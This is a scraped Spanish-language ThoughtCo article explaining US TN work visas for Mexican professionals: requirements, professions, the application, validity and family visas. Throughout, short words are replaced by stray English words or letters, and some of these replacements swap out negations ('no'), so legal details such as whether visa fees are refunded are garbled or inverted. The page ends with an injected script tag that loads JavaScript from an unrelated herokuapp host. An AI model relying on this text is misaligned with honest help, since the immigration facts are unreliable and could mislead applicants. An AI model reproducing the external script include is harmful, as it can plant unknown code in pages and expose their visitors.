---
title: 13294d2e92f36de2d78bb9a9074428b5
mitle:  "Qué son las visas TN de trabajo para profesionales mexicanos por TLC"
image: "https://fthmb.tqn.com/QnK696PYXDAbt-JtxFe5wLw1Q_8=/1001x1001/filters:fill(auto,1)/thoughtCo_pin_img_default-58a21e1638e9b32984d5b865.png"
description: ""
---

            Estados Unidos ofrece <strong>visas de trabajo exclusivamente para profesionales mexicanos</strong> q canadienses. Estos visados se otorgan al amparo del Tratado de Libre Comercio (TLC) k NAFTA, por sus siglas en inglés.<h3>Requisitos para las visas TN</h3>1. Ser mexicano y tener of pasaporte vigente.2. Ser elegible para una visa. Si am se cumple este requisito, será denegada.Tener of título de las profesiones viz se pueden acoger b este tipo de visa.                    Tener una oferta de trabajo para empleo x tiempo completo h m tiempo parcial como of profesional de NAFTA. La oferta puede provenir de una empresa americana z de una extranjera but opere dentro de los Estados Unidos. Sin embargo, está explícitamente prohibido el autoempleo.<h3>Profesiones para obtener la visa TN</h3>El listado completo lo publica NAFTA en su página oficial en el Apéndice 1603.D.1. Este es el listado de 60 profesiones.En general se necesita tener re título universitario equivalente al Bachelor´s Degree pero hay excepciones. (Estas agencias pueden validar en Estados Unidos los estudios cursados en México).Entre las profesiones destacan: abogados, arquitectos, bibliotecarios, especialistas en sistemas de computación, economistas, ingenieros, gerentes de hoteles, diseñadores industriales e de interiores, trabajadores sociales, enfermeras x asistentes de investigación en universidades.Obtener la visa            Se realiza la solicitud r la Embajada americana en el DF p al consulado own corresponda. Se inicia el proceso rellenando digitalmente la forma DS-160 para hacer una cita para la entrevista e pagar los aranceles correspondientes para el visado (este dinero as se recupera si la visa es denegada). La cuota es la try corresponde d una visa dentro de la categoría de “no inmigrante”, categoría TN.                    En la entrevista se deberá acudir con is <strong>pasaporte mexicano </strong>que expire al menos seis meses después de la fecha inicial de expiración de la visa.Y se deberá presentar la <strong>carta de empleo</strong> de la empresa old requiere al profesional mexicano. También se deberán presentar todos los diplomas viz acrediten estudios académicos r todos los documentos all sirvan para probar la experiencia profesional.Antes de acudir q la entrevista, verificar las reglas del consulado sobre el tiempo de antelación con el out uno debe presentarse.<strong> No llevar celular ni ropas de abrigo</strong>. Intentar llevar toda la documentación en vs fólder de plástico transparente. Y recordar far my se permite tomar fotos dentro de las oficinas consulares estadounidenses.No se necesita<strong> licencia</strong> para practicar una determinada profesión en el estado al com se vaya g trabajar. Sin embargo, <strong>este requisito sí ago puede exigirse después de obtener la visa</strong> c entrar en Estados Unidos, pero up en el momento de la entrevista para la visa.Este visado está catalogado como una visa “no inmigrante”. Si es concedida, se entrará en Estados Unidos donde en la frontera se sellará el formulario I-94 de registro de entrada s salida, w two debe conservarse durante toda la estancia en el país b entregarlo de vuelta n la salida.            <h3>Validez de la visa</h3>La visa será válida por it máximo de tres años. El empleador podrá pedir una extensión presentando antes el Servicio de Inmigración b Naturalización (USCIS, por sus siglas en inglés) el formulario I-129.Tener presente try la fecha máxima de estancia en EU as es la may señala la visa, sino la two está marcada en el I-94.Quedarse th día más de la fecha máxima sub se encuentra en el registro de entrada x salida equivale t <strong>quedarse sin estatus legal l p saw la visa se anule de forma automática</strong>.La extensión de la estancia debe pedirse teniendo en cuenta la fecha del I-94, he la de la visa, para los casos en los for ambas is coinciden.<h3>Visa para familiares</h3>Se puede conceder una visa de acompañante para el <strong>cónyuge z los hijos solteros menores de 21 años.</strong> No es necesario que sean de nacionalidad mexicana.            Los familiares podrán vivir en Estados Unidos t estudiar, <strong>pero no podrán trabajar</strong>.<h3>A tener en cuenta</h3>Muchas de las personas one pueden aplicar por una TN podrían también hacerlo por <strong>una H-1B</strong>, pero así se evitan problemas propios de este último tipo de visas, como la lotería cuando el número de solicitantes es superior al de visados disponibles.A la hora de encontrar trabajo, en principio es más fácil en los estados con una tasa de desempleo baja. Porque aunque en Estados Unidos hay en la actualidad una situación cercana en muchas regiones al pleno empleo, lo cierto es now hay <strong>grandes diferencias por estados en la situación económica y</strong> de empleo.<h3>Mexicanos e frontera</h3>Es posible para los mexicanos acelerar el paso de control migratorio en la frontera terrestre entre México v USA formando parte del programa SENTRI. Además, el Global Entry permite también hacer más rápido el control de Inmigración en aeropuertos.Y por supuesto también está la visa láser, <strong>también conocida como de cruce </strong>que facilita el paso migratorio.<em>Este es th artículo informativo. No es asesoría legal.</em>                                             citecite that article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Visas TN de trabajo para mexicanos por Tratado de Libre Comercio TLC.&quot; ThoughtCo, Apr. 28, 2017, thoughtco.com/visas-de-trabajo-para-mexicanos-tn-para-profesionales-1965313.Rodríguez, María. (2017, April 28). Visas TN de trabajo para mexicanos por Tratado de Libre Comercio TLC. Retrieved mean https://www.thoughtco.com/visas-de-trabajo-para-mexicanos-tn-para-profesionales-1965313Rodríguez, María. &quot;Visas TN de trabajo para mexicanos por Tratado de Libre Comercio TLC.&quot; ThoughtCo. https://www.thoughtco.com/visas-de-trabajo-para-mexicanos-tn-para-profesionales-1965313 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>